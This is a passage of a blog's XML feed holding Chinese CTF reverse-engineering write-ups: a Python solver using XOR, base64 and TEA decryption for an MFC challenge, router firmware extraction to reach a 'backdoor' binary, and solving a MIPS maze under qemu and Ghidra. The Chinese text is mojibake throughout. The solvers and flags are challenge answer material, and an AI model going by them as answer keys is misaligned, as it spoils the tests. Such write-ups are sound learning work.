class="number">0x7C3C71F1B295D77F</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v13, v16, v17:</span><br><span class="line">print(hex(s.model()[i].as_long()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'usat'</span>)</span><br><span class="line"></span><br><span class="line">enc2 = [<span class="number">0x2d46347f</span>, <span class="number">0x5e79f6f4</span>, <span class="number">0xDF3634AE</span>, <span class="number">0x2F9970FF</span>, <span class="number">0x6cacebd5</span>, <span class="number">0x12c2fc6d</span>, <span class="number">0xe8e95dc6</span>, <span class="number">0xc558d3ec</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">def delta():</span></span><br><span class="line"><span class="string">a = 0</span></span><br><span class="line"><span class="string">for i in range(32):</span></span><br><span class="line"><span class="string">a += 0x2433B95A</span></span><br><span class="line"><span class="string">a &amp;= 0xffffffff</span></span><br><span class="line"><span class="string">return a</span></span><br><span class="line"><span class="string">print(hex(delta()))</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x0D9610D02</span>, <span class="number">0x2AADA57D</span>, <span class="number">0x0A37537F1</span>, <span class="number">0x0C29E3913</span>, <span class="number">0x0D5942CE8</span>, <span class="number">0x608CCE66</span>, <span class="number">0x6D593422</span>, <span class="number">0x21E5D6F2</span>, <span class="number">0x0ED3A9235</span>, <span class="number">0x9DAD62C4</span>, <span class="number">0x3856641B</span>, <span class="number">0x71F75B9D</span>, <span class="number">0x0DCDEDAE8</span>, <span class="number">0x0EAD2D1A0</span>, <span class="number">0x0BAC4F564</span>, <span class="number">0x0DA4772AC</span>]</span><br><span class="line">enc1 = [<span class="number">36</span>,  <span class="number">72</span>,  <span class="number">77</span>,  <span class="number">37</span>,  <span class="number">47</span>,  <span class="number">78</span>,  <span class="number">69</span>,  <span class="number">88</span>,  <span class="number">44</span>,  <span class="number">55</span>, </span><br><span class="line">   <span class="number">57</span>,  <span class="number">80</span>,  <span class="number">66</span>,  <span class="number">78</span>,  <span class="number">92</span>,  <span class="number">67</span>,  <span class="number">47</span>,  <span class="number">66</span>,  <span class="number">81</span>,  <span class="number">76</span>, </span><br><span class="line">   <span class="number">86</span>,  <span class="number">83</span>,  <span class="number">87</span>,  <span class="number">44</span>,  <span class="number">42</span>,  <span class="number">47</span>,  <span class="number">39</span>,  <span class="number">56</span>,  <span class="number">84</span>,  <span class="number">35</span>, </span><br><span class="line">   <span class="number">85</span>,  <span class="number">77</span>,  <span class="number">67</span>,  <span class="number">52</span>,  <span class="number">37</span>,  <span class="number">69</span>,  <span class="number">71</span>,  <span class="number">64</span>,  <span class="number">64</span>,  <span class="number">64</span>, </span><br><span class="line">   <span class="number">44</span>,  <span class="number">46</span>,  <span class="number">37</span>,  <span class="number">53</span>]</span><br><span class="line">in_put = <span class="string">'asfa2asf1asfsa13asfsfasasfas313ssljlslgjlasjlsagljlagaaslagsafsasa'</span></span><br><span class="line">a = [<span class="number">0x21</span>, <span class="number">0x5B</span>, <span class="number">0xD0</span>, <span class="number">0x3D</span>, <span class="number">0xE1</span>, <span class="number">0xE5</span>, <span class="number">0x2F</span>, <span class="number">0x7C</span>, <span class="number">0xD1</span>, <span class="number">0x79</span>, </span><br><span class="line"><span class="number">0x8E</span>, <span class="number">0x59</span>, <span class="number">0x2E</span>, <span class="number">0xAF</span>, <span class="number">0xC7</span>, <span class="number">0x88</span>, <span class="number">0x5C</span>, <span class="number">0x35</span>, <span class="number">0x25</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0x1C</span>, <span class="number">0xC8</span>, <span class="number">0x2F</span>, <span class="number">0x82</span>, <span class="number">0x97</span>, <span class="number">0x2E</span>, <span class="number">0x9C</span>, <span class="number">0xD6</span>, <span class="number">0x8A</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>]</span><br><span class="line">xor = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>):</span><br><span class="line">xor += [ord(in_put[i])^a[i]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------1--------------------</span></span><br><span class="line">base = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc1)):</span><br><span class="line">enc1[i] -= <span class="number">35</span></span><br><span class="line">flag1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc1:</span><br><span class="line">flag1 += base[i]</span><br><span class="line">flag1 = base64.b64decode(flag1.encode())</span><br><span class="line">flag1 = list(flag1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag1)):</span><br><span class="line">flag1[i] ^= xor[i]</span><br><span class="line">flag1 = <span class="string">''</span>.join(map(chr, flag1))</span><br><span class="line">print(flag1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------2--------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de_tea</span><span class="params">(a, b, key)</span>:</span></span><br><span class="line">sum = <span class="number">0x86772b40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">b -= (a+sum) ^ ((a&lt;&lt;<span class="number">4</span>)+key[<span class="number">2</span>]) ^ ((a&gt;&gt;<span class="number">5</span>)+key[<span class="number">3</span>])</span><br><span class="line">b &amp;= <span class="number">0xffffffff</span></span><br><span class="line">a -= (b+sum) ^ ((b&lt;&lt;<span class="number">4</span>)+key[<span class="number">0</span>]) ^ ((b&gt;&gt;<span class="number">5</span>)+key[<span class="number">1</span>])</span><br><span class="line">a &amp;= <span class="number">0xffffffff</span></span><br><span class="line">sum -= <span class="number">0x2433B95A</span></span><br><span class="line">sum &amp;= <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">return</span> [a, b]</span><br><span class="line">   </span><br><span class="line">ans = []</span><br><span class="line">flag2 = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc2), <span class="number">2</span>):</span><br><span class="line">ans += de_tea(enc2[i], enc2[i+<span class="number">1</span>], key[<span class="number">4</span>*(i//<span class="number">2</span>):])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">flag2 += long_to_bytes(i)[::<span class="number">-1</span>]</span><br><span class="line">print(flag2)</span><br><span class="line">print(flag1+<span class="string">'f'</span>+flag2.decode())</span><br></pre></td></tr></table></figure><p>æœ€åæ¶ˆæ¯æ˜ å°„è¡¨çš„ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP</span>&#123;</span></span><br><span class="line">    AFX_MSGMAP * pBaseMessageMap;</span><br><span class="line">    AFX_MSGMAP_ENTRY * lpEntries;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP_ENTRY</span>&#123;</span></span><br><span class="line">    UINT nMessage;    <span class="comment">//Windows Message</span></span><br><span class="line">    UINT nCode        <span class="comment">//Control code or WM_NOTIFY code</span></span><br><span class="line">    UINT nID;         <span class="comment">//control ID (or 0 for windows messages)</span></span><br><span class="line">    UINT nLastID;     <span class="comment">//used for entries specifying a range of control id's</span></span><br><span class="line">    UINT nSig;        <span class="comment">//signature type(action) or pointer to message </span></span><br><span class="line">    AFX_PMSG pfn;     <span class="comment">//routine to call (or specical value)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç¬¬ä¸€æ¬¡æ‰“è¿™ä¸ªæ¯”èµ›ï¼Œé¢˜ç›®éƒ½åéš¾å§ã€‚ã€‚åšäº†ä¸€ä¸ªarmæ¶æ„çš„é¢˜ï¼Œç„¶åUnravelMFCè¿™ä¸ªé¢˜ï¼Œæ¯”èµ›æ—¶å­¦é•¿å¸ˆå‚…åšäº†ï¼Œå°±æ²¡åšäº†ï¼Œèµ›åæŠŠå®ƒå¤ç°äº†ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;é“¾æ¥ï¼š&lt;a href=&quot;https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1zD_x5Z_2ktIWjFzoOKn_5A&lt;/a&gt;&lt;br&gt;æå–ç ï¼šmflo&lt;br&gt;å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>ä»ä¸€é“CTFé¢˜ç®€å•æ¥è§¦è·¯ç”±å™¨é€†å‘</title>
    <link href="https://www.bxnop.cn/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/"/>
    <id>https://www.bxnop.cn/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/</id>
    <published>2020-10-04T10:03:43.000Z</published>
    <updated>2020-10-04T10:46:04.545Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å…³é”®é‡åˆ°ä¸€ä¸ªç”±äºGlibcç‰ˆæœ¬å˜åŒ–å‡ºç°çš„é—®é¢˜ï¼ŒèŠ±äº†äº›æ—¶é—´è§£å†³ã€‚ã€‚<a id="more"></a></p></blockquote><p>é¦–å…ˆæ˜¯å¯¹è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿçš„å­¦ä¹ ï¼Œçœ‹äº†ä¸€ç¯‡æ–‡ç« ï¼Œè¿™é‡Œç›´æ¥è´´ä¸Šï¼š<a href="https://www.cnblogs.com/blacksunny/p/7208451.html" target="_blank" rel="noopener">è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿä¸æå–</a></p><p>ç„¶åè¿™ä¸ªCTFé¢˜æ¥è‡ªBUUï¼š<strong>firmware</strong></p><p>ä¸‹è½½åå¾—åˆ°ä¸€ä¸ªbinæ–‡ä»¶ï¼Œfileä¸€ä¸‹ï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004180937146.png" alt="image-20201004180937146"></p><p>ä»æœ€ä¸Šé¢çš„æ–‡ç« å¯ä»¥çŸ¥é“è¿™æ˜¯å›ºä»¶é‡Œçš„binæ–‡ä»¶åˆ†æã€‚</p><p>é¦–å…ˆä½¿ç”¨binwalk æå–å‡ºï¼Œå¾—åˆ°ä¸€ä¸ªSquashfs æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004181455157.png" alt="image-20201004181455157"></p><p>å¯¹äºSquashfs æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨firmware-mod-kitå·¥å…·æ¥è¿›è¡Œè§£å‹ã€‚<a href="https://blog.csdn.net/ldwj2016/article/details/80712566" target="_blank" rel="noopener">fiemware-mod-kitå·¥å…·çš„å®‰è£…</a></p><p>é‡åˆ°çš„é—®é¢˜æ¥äº†ã€‚è·Ÿç€å®‰è£…å‰ç½®çš„æ–‡ä»¶åï¼Œåœ¨<strong>æ‰§è¡Œconfigureæ–‡ä»¶ç”ŸæˆMakefileæ–‡ä»¶ç„¶åmakeç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</strong>å‘ç”Ÿäº†é—®é¢˜ï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004182128948.png" alt="image-20201004182128948"></p><p>å…¶å®ä¸Šé¢çš„ä¹Ÿæœ‰å¾ˆå¤šwarningï¼Œä½†éƒ½èƒ½é€šè¿‡çš„ï¼Œæ‰¾äº†ä¸€ç¯‡æ–‡ç« äº†è§£åŸå› ï¼Œ<a href="https://blog.csdn.net/baidu_35679960/article/details/78984497" target="_blank" rel="noopener">Cè¯­è¨€ä¸­å‡½æ•°ä¸å£°æ˜ä¹Ÿèƒ½ä½¿ç”¨</a></p><blockquote><p><strong>åœ¨å‡½æ•°å£°æ˜æ–¹é¢Cå’ŒC++åˆ™ä¸åŒï¼ŒC++è¯­è¨€ä¸­ï¼Œåœ¨è¢«è°ƒç”¨ä¹‹å‰æœªå£°æ˜æˆ–å®šä¹‰æ˜¯ä¸å…è®¸çš„ï¼Œè€ŒCè¯­è¨€æ˜¯å…è®¸çš„ã€‚</strong></p></blockquote><p>ç„¶åå°±æ˜¯å‡ºç°errorçš„åŸå› å¯»æ‰¾ã€‚ã€‚</p><p>æœ€å¼€å§‹æ²¡ä»”ç»†çœ‹å‡ºé”™åŸå› ï¼Œç›´æ¥æŠŠä¸€å¤§æ®µé”™è¯¯googleå’Œç™¾åº¦ï¼Œä½†å‘ç°å¤§å®¶éƒ½æ²¡æœ‰å‡ºç°è¿™æ ·çš„é—®é¢˜ã€‚ã€‚æ‰¾äº†å¾ˆä¹…ã€‚ã€‚</p><p>ç„¶åå¼€å§‹ä»”ç»†çœ‹å‡ºé”™çš„åŸå› ï¼Œå³ä¸Šé¢ç”»çº¢çº¿çš„è¯­å¥ã€‚æœ€å¼€å§‹å¯¹<strong>collect2ï¼šerrorï¼šld return 1 exit status</strong>è¿›è¡Œäº†æœç´¢ã€‚æ‰¾åˆ°è§£é‡Šï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004182839147.png" alt="image-20201004182839147"></p><p>æ„æ€å°±æ˜¯ï¼šä¸Šé¢çš„undefined reference to â€” å¯¼è‡´å‡ºé”™ã€‚è€Œ<strong>undefined reference to â€”</strong> å‡ºé”™çš„åŸå› æ˜¯æˆ‘ä»¬åœ¨ç¨‹åºä¸­ä½¿ç”¨äº†æœªå®šä¹‰çš„å‡½æ•°ã€‚</p><p>ç°åœ¨erroråŸå› æ¸…æ™°å¤šäº†ï¼Œgoogleä¹Ÿæ›´ç›®æ ‡åŒ–äº†ã€‚ç„¶åæ‰¾åˆ°äº†æœ€ç»ˆåŸå› ï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004183233667.png" alt="image-20201004183233667"></p><p>æœ€åæ‰¾åˆ°æ‰€æœ‰è¦ç¼–è¯‘çš„æ–‡ä»¶æ·»åŠ ä¸Šï¼š<strong>#include &lt;sys/sysmacros.h&gt;</strong>å³å¯ã€‚</p><p>å‡†å¤‡å·¥ä½œå®Œæˆï¼Œå¼€å§‹å¯¹Squashfs æ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶è§£å‹ï¼š</p><p>åœ¨firmware/firmware-mod-kitç›®å½•ä¸‹ï¼Œä½¿ç”¨<strong>./unsquashfs_all.sh éœ€è¦è§£å‹æ–‡ä»¶çš„ç›®å½•</strong>ï¼š<img src="/2020/10/04/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%AE%80%E5%8D%95%E6%8E%A5%E8%A7%A6%E8%B7%AF%E7%94%B1%E5%99%A8%E9%80%86%E5%90%91/image-20201004183726652.png" alt="image-20201004183726652"></p><p>æœ€ååœ¨è§£å‹å¾—åˆ°æ–‡ä»¶ç›®å½•ï¼š<strong>squashfs-root/tmp</strong>ä¸‹å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„backdoorç¨‹åºã€‚ç„¶åè„±å£³ï¼Œæ‰¾stringã€‚</p><p><strong>æœ¬æ–‡æ›´å¤šçš„æ˜¯å¯¹è‡ªå·±è§£å†³é—®é¢˜ä¸€æ­¥ä¸€æ­¥çš„è®°å½•ï¼Œä¹Ÿæ˜¯è·¯ç”±å™¨é€†å‘çš„ç®€å•å­¦ä¹ ã€‚</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;å…³é”®é‡åˆ°ä¸€ä¸ªç”±äºGlibcç‰ˆæœ¬å˜åŒ–å‡ºç°çš„é—®é¢˜ï¼ŒèŠ±äº†äº›æ—¶é—´è§£å†³ã€‚ã€‚&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>iot&amp;mipsç¨‹åºåŠ¨è°ƒ&amp;qemuå­¦ä¹ &amp;ghidra</title>
    <link href="https://www.bxnop.cn/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/"/>
    <id>https://www.bxnop.cn/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/</id>
    <published>2020-09-18T14:08:15.000Z</published>
    <updated>2020-09-19T03:34:00.038Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å¾çˆ±å¸ˆå‚…å‘äº†ä¸€ç¯‡å…³äºmipsç¨‹åºçš„é€†å‘ï¼Œåˆšæ¥è§¦é€†å‘é‡åˆ°è¿‡ä½†éƒ½è·³è¿‡äº†ï¼Œè¿™æ¬¡é‡åˆ°æ­£å¥½è¶æ­¤å­¦ä¹ ä¸€ä¸‹ã€‚</p></blockquote><a id="more"></a><h2 id="qemuçš„äº†è§£ä¸ghidra"><a href="#qemuçš„äº†è§£ä¸ghidra" class="headerlink" title="qemuçš„äº†è§£ä¸ghidra"></a>qemuçš„äº†è§£ä¸ghidra</h2><p>ä»¥è¯¥å¸ˆå‚…å‘çš„ioté€†å‘é¢˜ç›®æ¥å­¦ä¹ ã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919100306144.png" alt="image-20200919100306144">ä¸‹è½½åæœ‰3ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯æç¤ºï¼š</p><blockquote><p><strong>é¢˜ç›®è¿è¡Œå‘½ä»¤å¦‚ä¸‹:</strong><br><strong>sudo qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append â€œroot=/dev/sda console=tty50â€</strong> </p><p><strong>éœ€è¦åˆ†æçš„ç¨‹åºä¸º ./bin/maze</strong></p></blockquote><p>äº†è§£ä¸‹qemuï¼š</p><blockquote><p>Qemu  æ˜¯<strong>çº¯è½¯ä»¶å®ç°çš„è™šæ‹ŸåŒ–æ¨¡æ‹Ÿå™¨ï¼Œå‡ ä¹å¯ä»¥æ¨¡æ‹Ÿä»»ä½•ç¡¬ä»¶è®¾å¤‡</strong>ï¼Œæˆ‘ä»¬æœ€ç†Ÿæ‚‰çš„å°±æ˜¯èƒ½å¤Ÿæ¨¡æ‹Ÿä¸€å°èƒ½å¤Ÿç‹¬ç«‹è¿è¡Œæ“ä½œç³»ç»Ÿçš„è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºè®¤ä¸ºè‡ªå·±å’Œç¡¬ä»¶æ‰“äº¤é“ï¼Œä½†å…¶å®æ˜¯å’Œ Qemu æ¨¡æ‹Ÿå‡ºæ¥çš„ç¡¬ä»¶æ‰“äº¤é“ï¼ŒQemu å°†è¿™äº›æŒ‡ä»¤è½¬è¯‘ç»™çœŸæ­£çš„ç¡¬ä»¶ã€‚</p></blockquote><p>å…¶å®å°±æ˜¯qemuå¯ä»¥æ¨¡æ‹Ÿä¸€äº›å¯¹åº”ç¨‹åºéœ€è¦ç¯å¢ƒæ¥è®©æ‰§è¡Œå¯¹åº”çš„ç¨‹åºã€‚</p><p>ç»è¿‡ä¸€ç•ªç†è§£åï¼Œå…¶å®å°±æ˜¯ä½¿ç”¨qemuåˆ©ç”¨æ‰€ç»™çš„2ä¸ªæ–‡ä»¶æ¥æ¨¡æ‹Ÿopenwrtç³»ç»Ÿæ¥è¿è¡Œï¼Œæˆ‘ä»¬çŸ¥é“linuxçš„æ¯ä¸ªå‘½ä»¤éƒ½æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œæˆ‘ä»¬è¦åˆ†æçš„mazeæ–‡ä»¶ä¹Ÿåœ¨è¯¥å‘½ä»¤æ–‡ä»¶å¤¹ä¸­ï¼ˆbinï¼‰ã€‚</p><p>ç”±äº.ext4æ–‡ä»¶æ˜¯å¯ä»¥ç›´æ¥è§£å‹çš„ï¼Œé¦–å…ˆå°†å…¶è§£å‹åå¾—åˆ°è¦åˆ†æçš„mazeæ–‡ä»¶ã€‚</p><p>æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ä¿¡æ¯ï¼š32ä¸ºå°ç«¯mipsçš„åŠ¨æ€é“¾æ¥ç¨‹åºã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919001345047.png" alt="image-20200919001345047"></p><p>æ‰§è¡Œä¸€ä¸‹çœ‹ï¼Œå‘ç°ä¸èƒ½æ‰§è¡Œï¼Œå› ä¸ºè¿™ä¸ªmipsæ¡†æ¶çš„ï¼ŒæŸ¥èµ„æ–™æ‰çŸ¥é“å¯ä»¥ä½¿ç”¨qemuæ¥æ¨¡æ‹Ÿmipsç¯å¢ƒæ¥æ‰§è¡Œmipsç¨‹åºã€‚</p><p>é¢˜ç›®æœ‰æç¤ºçš„ï¼Œåœ¨ä¸Šé¢å‘Šè¯‰äº†æˆ‘ä»¬<strong>é¢˜ç›®è¿è¡Œå‘½ä»¤</strong>ï¼š</p><p>æ‰€ä»¥é¦–å…ˆæˆ‘ä»¬æ˜¯è¦å®‰è£…qemuçš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›å…¥è¯¥æ¨¡æ‹Ÿçš„openwrtç³»ç»Ÿï¼Œç®€å•æ‰§è¡Œä¸€ä¸‹mazeç¨‹åºï¼Œå¯ä»¥çœ‹è§ï¼Œè¿˜å¯ä»¥è¿›è¡Œgdbè°ƒè¯•ã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200918235617145.png" alt="image-20200918235617145"></p><p>ç”±äºida7.5ä»¥ä¸‹ä¸”ä¸ä½¿ç”¨<code>retdec</code>æ’ä»¶æ˜¯ä¸èƒ½åç¼–è¯‘mipsæ¡†æ¶ç¨‹åºçš„ï¼ŒçŸ¥é“å¯ä»¥ä½¿ç”¨ghidraã€‚ä¸‹è½½åï¼Œæ‰¾äº†ä¸€ä¸ªæ•™ç¨‹å­¦ä¹ äº†ä¸‹ï¼Œ<a href="https://bbs.pediy.com/thread-251204.htm" target="_blank" rel="noopener">Ghidraä½¿ç”¨</a>ï¼Œå…¶å®å’Œidaä¹Ÿæ€»ä½“å·®ä¸å¤šï¼Œä¸Šæ‰‹ä¼šå¾ˆå¿«ï¼Œä½†æ²¡æœ‰idaé‚£ä¹ˆæ–¹ä¾¿ã€‚</p><p>ç”±äºä»¥å‰å­¦ä¹ javaå®‰è£…è¿‡jdkä¸”é…ç½®äº†ç¯å¢ƒå˜é‡ï¼Œä¸‹è½½è¯¥ç¨‹åºåå¯ä»¥ç›´æ¥ä½¿ç”¨å¾ˆæ–¹ä¾¿ã€‚è½½å…¥ç¨‹åºï¼š<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919002432181.png" alt="image-20200919002432181"></p><p>æ–‡ä»¶åéƒ½æ˜¯mazeï¼ˆè¿·å®«ï¼‰ï¼Œä¸”é€šè¿‡ä¼ªä»£ç å¯ä»¥å¾ˆå¿«çœ‹æ¸…ç¨‹åºæµç¨‹ï¼Œè¿™é“é¢˜ä¹Ÿæ˜¯mazeçš„è€å¥—è·¯äº†ï¼Œé¦–å…ˆç”Ÿæˆä¸€ä¸ªè¡¨ï¼Œç„¶åé€šè¿‡æŒ‡å®šå­—ç¬¦ï¼ˆU D L Rï¼‰æ§åˆ¶èµ°å‘ï¼Œåˆ°è¾¾ä¸€ä¸ªç›®çš„åœ°ã€‚</p><p>è¿™é‡Œå¯ä»¥é€šè¿‡ä¼ªä»£ç è®¡ç®—å‡ºè¯¥è¡¨ï¼Œä½†å¯ä»¥ç›´æ¥é€šè¿‡æ¨¡æ‹Ÿçš„openwrtç³»ç»Ÿgdbè°ƒè¯•ï¼Œå°±è°ƒè¯•å¥½äº†ã€‚<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003129670.png" alt="image-20200919003129670"></p><p>ç„¶ådumpå‡ºæ•°æ®ï¼š<strong>dump binary memroy dump.txt 0x4110d0 0x411147</strong><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003201998.png" alt="image-20200919003201998"></p><p>Cè¯­è¨€æŒ‰15*8æ‰“å°ä¸€ä¸‹ï¼š</p><p><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003349559.png" alt="image-20200919003349559"></p><p>æœ€åèµ°ä¸€ä¸‹å¾—ç»“æœï¼šDDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003440203.png" alt="image-20200919003440203"></p><h2 id="mipsç¨‹åºçš„idaåŠ¨è°ƒä¸gdbè°ƒè¯•"><a href="#mipsç¨‹åºçš„idaåŠ¨è°ƒä¸gdbè°ƒè¯•" class="headerlink" title="mipsç¨‹åºçš„idaåŠ¨è°ƒä¸gdbè°ƒè¯•"></a>mipsç¨‹åºçš„idaåŠ¨è°ƒä¸gdbè°ƒè¯•</h2><p>å½“ç„¶åˆ°è¿™é‡Œè‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œä¸‡ä¸€ç¨‹åºæ²¡æœ‰ç»™èƒ½èƒ½è®©è¯¥mipsç¨‹åºè¿è¡Œçš„æ–‡ä»¶ç³»ç»Ÿï¼Œé‚£æˆ‘ä»¬è¿˜æ˜¯è‡ªå·±æƒ³åŠæ³•è®©ç¨‹åºè¿è¡Œèµ·æ¥è¿›è€ŒåŠ¨è°ƒã€‚</p><p>åœ¨ä¸Šé¢ä¸ºäº†æ¨¡æ‹Ÿopenwrtç³»ç»Ÿè¿è¡Œï¼Œå·²ç»å®‰è£…äº†qemu-userã€‚è¿™æ—¶å€™é™æ€é“¾æ¥çš„mipsç¨‹åºæˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œäº†ï¼Œä½†ä¸€èˆ¬çš„ç¨‹åºçš„ç¨‹åºéƒ½æ˜¯åŠ¨æ€é“¾æ¥çš„ï¼Œæˆ‘ä»¬åªè¦å®‰è£…å¥½<strong>å¯¹åº”çš„æ¶æ„ç¨‹åºçš„å…±äº«åº“</strong>å°±å¥½äº†ã€‚<a href="https://www.cnblogs.com/WangAoBo/p/debug-arm-mips-on-linux.html" target="_blank" rel="noopener">å­¦ä¹ å®‰è£…çš„æ–‡ç« 